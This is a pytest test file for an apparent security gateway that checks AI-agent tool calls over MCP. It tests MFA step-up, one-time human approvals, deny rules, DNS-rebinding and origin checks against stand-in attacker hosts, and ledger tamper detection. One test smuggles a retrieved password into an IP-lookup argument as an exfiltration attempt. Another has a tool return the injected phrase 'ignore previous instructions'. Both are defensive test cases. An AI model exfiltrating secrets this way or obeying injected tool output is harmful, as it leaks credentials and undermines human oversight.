from __future__ import annotations

from mfa import totp
from sentinel.db import ReceiptRow, get_session_factory
from tests.helpers import call, headers


def _rpc(client, hdrs, method, params=None, rid=1, session_id=None, extra=None):
    h = {**hdrs, "Content-Type": "application/json", "Accept": "application/json, text/event-stream", **(extra or {})}
    if session_id:
        h["Mcp-Session-Id"] = session_id
    body = {"jsonrpc": "2.0", "method": method, "params": params or {}}
    if rid is not None:
        body["id"] = rid
    return client.post("/mcp", headers=h, json=body)


def test_streamable_http_mcp_endpoint(client):
    hdrs = headers("SECURITY_ADMIN", subject="local-user")
    init = _rpc(client, hdrs, "initialize", {"protocolVersion": "2025-11-25", "capabilities": {}, "clientInfo": {"name": "test"}})
    assert init.status_code == 200
    sid = init.headers["mcp-session-id"]
    assert init.json()["result"]["protocolVersion"] == "2025-11-25"
    assert _rpc(client, hdrs, "notifications/initialized", rid=None, session_id=sid).status_code == 202
    tools = _rpc(client, hdrs, "tools/list", rid=2, session_id=sid).json()["result"]["tools"]
    names = {t["name"] for t in tools}
    assert {"fixture__search_logs", "sentinel_invoke", "sentinel_discover_tools"} <= names
    res = _rpc(client, hdrs, "tools/call", {"name": "fixture__search_logs", "arguments": {"query": "10.0.0.1"}}, rid=3, session_id=sid).json()["result"]
    assert res["isError"] is False and "MCP-Sentinel" in res["content"][-1]["text"]
    via_meta = _rpc(client, hdrs, "tools/call", {"name": "sentinel_invoke", "arguments": {"tool": "fixture__lookup_ip", "arguments": {"ip": "8.8.8.8"}}}, rid=4, session_id=sid).json()
    assert via_meta["result"]["isError"] is False
    unknown = _rpc(client, hdrs, "nope/method", rid=5, session_id=sid).json()
    assert unknown["error"]["code"] == -32601


def test_mcp_endpoint_guards(client):
    hdrs = headers("SECURITY_ADMIN")
    assert _rpc(client, {}, "ping").status_code == 401
    assert _rpc(client, hdrs, "ping", extra={"Origin": "http://localhost.evil.com"}).status_code == 403
    assert _rpc(client, hdrs, "ping", extra={"MCP-Protocol-Version": "1999-01-01"}).status_code == 400
    assert _rpc(client, hdrs, "ping", session_id="does-not-exist").status_code == 404
    assert client.get("/mcp").status_code == 405
    assert client.get("/health", headers={"Host": "attacker.example"}).status_code == 400  # DNS rebinding


def test_mfa_totp_stepup_and_action_bound_lease(client):
    user = headers("SECURITY_ADMIN", subject="alice")
    enroll = client.post("/v1/mfa/totp/enroll", headers=user, json={}).json()
    step = totp.current_step()
    assert client.post("/v1/mfa/totp/activate", headers=user, json={"code": totp.code_at(enroll["secret"], step)}).status_code == 200
    first = call(client, "wf-alice", "get_credentials", {"system": "vpn"}, user, user_intent="rotate the vpn credential")
    assert first["decision"] == "MFA_REQUIRED"
    cid = first["mfa_challenge_id"]
    bob = headers("SECURITY_ADMIN", subject="bob")
    assert client.post(f"/v1/mfa/challenges/{cid}/verify", headers=bob, json={"code": "123456"}).status_code == 403
    assert client.post(f"/v1/mfa/challenges/{cid}/verify", headers=user, json={"code": totp.code_at(enroll["secret"], step)}).status_code == 400  # replay
    ok = client.post(f"/v1/mfa/challenges/{cid}/verify", headers=user, json={"code": totp.code_at(enroll["secret"], step + 1)})
    assert ok.status_code == 200 and ok.json()["method"] == "totp"
    retry = call(client, "wf-alice", "get_credentials", {"system": "vpn"}, user, user_intent="rotate the vpn credential")
    assert retry["decision"] in {"ALLOW", "MONITOR", "RESTRICT"} and retry["execution"]["executed"]
    # the lease is bound to the exact approved action: different arguments need a new step-up
    other = call(client, "wf-alice", "get_credentials", {"system": "prod-db"}, user, user_intent="rotate the vpn credential")
    assert other["decision"] == "MFA_REQUIRED"


def test_human_approval_rule_is_single_use(client):
    admin = headers("SECURITY_ADMIN", subject="admin")
    rule = client.post("/v1/policy/rules", headers=admin, json={"name": "approve tickets", "effect": "REQUIRE_APPROVAL", "match": {"tool": "create_ticket"}})
    assert rule.status_code == 200
    analyst = headers("ANALYST", subject="analyst")
    first = call(client, "wf-appr", "create_ticket", {"title": "x"}, analyst)
    assert first["decision"] == "HUMAN_APPROVAL" and first["approval_id"]
    assert client.post(f"/v1/approvals/{first['approval_id']}/approve", headers=analyst).status_code == 403  # not an admin
    assert client.post(f"/v1/approvals/{first['approval_id']}/approve", headers=admin).json()["status"] == "APPROVED"
    second = call(client, "wf-appr", "create_ticket", {"title": "x"}, analyst)
    assert second["decision"] in {"ALLOW", "MONITOR", "RESTRICT"} and second["execution"]["executed"]
    third = call(client, "wf-appr", "create_ticket", {"title": "x"}, analyst)
    assert third["decision"] == "HUMAN_APPROVAL"  # approval was consumed


def test_policy_deny_rule_and_lockdown(client):
    admin = headers("SECURITY_ADMIN", subject="admin")
    client.post("/v1/policy/rules", headers=admin, json={"name": "no isolation", "effect": "DENY", "match": {"capabilities": ["INFRASTRUCTURE_CONTROL"]}})
    denied = call(client, "wf-deny", "isolate_host", {"hostname": "web01"}, headers("SECURITY_ADMIN", mfa=True))
    assert denied["decision"] == "BLOCK" and denied["policy_id"].startswith("deny.rule.")
    assert client.put("/v1/policy/lockdown", headers=admin, json={"mode": "deny_all"}).status_code == 200
    assert call(client, "wf-lock", "search_logs", {"query": "x"}, headers())["policy_id"] == "deny.lockdown"
    client.put("/v1/policy/lockdown", headers=admin, json={"mode": "approve_writes"})
    assert call(client, "wf-lock2", "search_logs", {"query": "x"}, headers())["decision"] in {"ALLOW", "MONITOR"}
    assert call(client, "wf-lock2", "create_ticket", {"title": "x"}, headers())["decision"] == "HUMAN_APPROVAL"


def test_taint_blocks_secret_smuggled_through_lookup(client):
    mfa = headers("SECURITY_ADMIN", mfa=True)
    creds = call(client, "wf-taint", "get_credentials", {"system": "payroll"}, mfa, user_intent="rotate the payroll credential")
    assert creds["execution"]["executed"]
    secret = creds["output"]["structuredContent"]["password"]
    exfil = call(client, "wf-taint", "lookup_ip", {"ip": f"203.0.113.7/?d={secret}"}, mfa, user_intent="rotate the payroll credential")
    assert exfil["decision"] == "BLOCK"
    assert any("secret material" in r for r in exfil["reasons"])


def test_outputs_are_guarded(client):
    from tests.fixtures.mcp_test_server import STATE

    STATE["compromised"] = True  # the server now returns an instruction-style string in its output
    result = call(client, "wf-out", "search_logs", {"query": "x"}, headers())
    assert result["execution"]["executed"]
    text = " ".join(c.get("text", "") for c in result["output"]["content"])
    assert "withheld" in text and "ignore previous instructions" not in text.lower()
    assert result["output_report"]["withheld"] and result["output_report"]["injection"]["detected"]
    events = client.get("/v1/events").json()
    assert any(e["event_type"] == "output_injection" for e in events)
    # the injection is remembered: the next sensitive call in this workflow carries that evidence
    later = call(client, "wf-out", "get_credentials", {"system": "vpn"}, headers("SECURITY_ADMIN"))
    assert any(f["name"] == "workflow_memory" for f in later["factors"])


def test_receipt_ledger_detects_tampering(client):
    call(client, "wf-ledger", "search_logs", {"query": "x"}, headers())
    call(client, "wf-ledger", "lookup_ip", {"ip": "1.1.1.1"}, headers())
    assert client.get("/v1/audit/verify").json()["ok"]
    session = get_session_factory()()
    row = session.query(ReceiptRow).order_by(ReceiptRow.seq.asc()).first()
    payload = dict(row.payload)
    payload["decision"] = "ALLOW-TAMPERED"
    row.payload = payload
    session.commit()
    session.close()
    verdict = client.get("/v1/audit/verify").json()
    assert not verdict["ok"] and verdict["broken_seq"] == 1


def test_demo_token_endpoint_and_identity_errors(client):
    assert client.post("/v1/demo/token", params={"role": "NOT_A_ROLE"}).status_code == 422
    assert client.post("/v1/mfa/complete", json={"challenge_id": "x"}).status_code == 401  # previously a 500
    assert client.get("/v1/auth/whoami", headers=headers("USER", subject="u1")).json()["subject"] == "u1"


def test_stdio_server_registration_with_honeypot(client, stdio_fixture_config):
    admin = headers("SECURITY_ADMIN")
    resp = client.post("/v1/servers", headers=admin, json={
        "server_name": "fixture stdio", "transport": "stdio", **stdio_fixture_config, "run_sandbox": True,
    })
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert data["sandbox"]["classification"] == "CLEAN"
    assert len(data["discovery"]["added"]) == 6
    names = {t["name"] for t in client.get("/v1/mcp/tools/list").json()["tools"]}
    assert "fixture_stdio__search_logs" in names
    out = call(client, "wf-stdio", "search_logs", {"query": "x"}, headers(), server_id=data["server_id"])
    assert out["execution"]["executed"]
    assert client.delete(f"/v1/servers/{data['server_id']}", headers=admin).status_code == 200
